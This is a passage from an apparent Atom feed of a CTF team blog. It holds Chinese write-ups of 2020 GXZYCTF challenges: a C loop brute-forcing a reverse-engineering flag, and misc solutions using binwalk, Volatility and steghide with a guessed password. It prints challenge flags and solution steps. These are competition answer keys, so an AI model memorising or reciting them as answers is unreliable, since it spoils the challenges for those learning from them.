class="number">0x1F891B</span>,<span class="number">0x2289F9</span>,<span class="number">0x1C883D</span>,<span class="number">0xEB773</span>,<span class="number">0xE6A90</span>,<span class="number">0xE6A90</span>,<span class="number">0xE6A90</span>,<span class="number">0xB1CCF</span>,<span class="number">0x1C883D</span>,<span class="number">0x2289F9</span>,<span class="number">0x22D6DC</span>,<span class="number">0x223D16</span>,<span class="number">0x21566D</span>,<span class="number">0x21098A</span>,<span class="number">0x1EEF55</span>,<span class="number">0x1E558F</span>,<span class="number">0x223D16</span>,<span class="number">0x1C883D</span>,<span class="number">0x22D6DC</span>,<span class="number">0x1F3C38</span>,<span class="number">0x1D2203</span>,<span class="number">0x21098A</span>,<span class="number">0x1C883D</span>,<span class="number">0x24A42E</span>,<span class="number">0x1E558F</span>,<span class="number">0x223D16</span>,<span class="number">0x21566D</span>,<span class="number">0xD83E7</span>,<span class="number">0x21566D</span>,<span class="number">0x21098A</span>,<span class="number">0x1E558F</span>,<span class="number">0x258AD7</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">51</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0x20</span>; j &lt;= <span class="number">0x7e</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0x4ce3</span> *j % (unsigned <span class="built_in">int</span>)<span class="number">0x8000000B</span> == result[i])</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"%c"</span>,j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">flag&#123;Thousandriver_is_1000%_stronger_than_zero-one&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有两层加密，第一次的正确作为smc解密的密钥&lt;br&gt;&lt;strong&gt;第一层考点：去反调试&lt;/strong&gt;&lt;br&gt;64位的程序发现有反调试&lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="Re_算法求解" scheme="https://boiteam.github.io/tags/Re-%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3/"/>
    
      <category term="Re_反调试" scheme="https://boiteam.github.io/tags/Re-%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
      <category term="Re_smc" scheme="https://boiteam.github.io/tags/Re-smc/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF ez_mem&amp;usb</title>
    <link href="https://boiteam.github.io/2020/03/17/2020_GXZCTF_ez_mem&amp;usb/"/>
    <id>https://boiteam.github.io/2020/03/17/2020_GXZCTF_ez_mem&amp;usb/</id>
    <published>2020-03-17T05:54:17.000Z</published>
    <updated>2020-03-21T12:00:30.686Z</updated>
    
    <content type="html"><![CDATA[<p>Binwalk分离出一个压缩包，解开得data.vmem文件</p><p>Volatility分析</p><p>得到flag.img文件</p><p><img src="/2020/03/17/2020_GXZCTF_ez_mem&usb/clip_image002.jpg" alt="微信图片_20200321005339"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Binwalk分离出一个压缩包，解开得data.vmem文件&lt;/p&gt;
    
    </summary>
    
    
      <category term="Misc" scheme="https://boiteam.github.io/categories/Misc/"/>
    
    
      <category term="Misc_隐写" scheme="https://boiteam.github.io/tags/Misc-%E9%9A%90%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF 武汉加油</title>
    <link href="https://boiteam.github.io/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/"/>
    <id>https://boiteam.github.io/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/</id>
    <published>2020-03-17T05:54:17.000Z</published>
    <updated>2020-03-21T13:04:53.518Z</updated>
    
    <content type="html"><![CDATA[<p>binwalk分析一下</p><p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/image-20200321202605726.png" alt="image-20200321202605726"></p><p>存在图片和一个rar压缩包，提取压缩包，里面是一个flag.exe的执行文件，打开后尝试输入发现，每输入六行就会返回一串字符串，猜测应该是需要输入特定的六个字符会返回flag；</p><p>使用steghide工具对图片进行分析</p><p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/clip_image004.jpg" alt="IMG_256"></p><p>发现确实存在隐藏信息，但是需要密码，爆破~！</p><p>密码是“ctf”</p><p>得到flag.txt</p><p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/clip_image006-1584793461286.jpg" alt="IMG_256"></p><p>打开flag.exe</p><p>输入“ ‘ 武 汉 加 油 ! ”得到flag</p><p><img src="/2020/03/17/2020_GXZCTF_%E6%AD%A6%E6%B1%89%E5%8A%A0%E6%B2%B9/clip_image008.jpg" alt="IMG_257"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;binwalk分析一下&lt;/p&gt;
    
    </summary>
    
    
      <category term="Misc" scheme="https://boiteam.github.io/categories/Misc/"/>
    
    
      <category term="Misc_代码分析" scheme="https://boiteam.github.io/tags/Misc-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
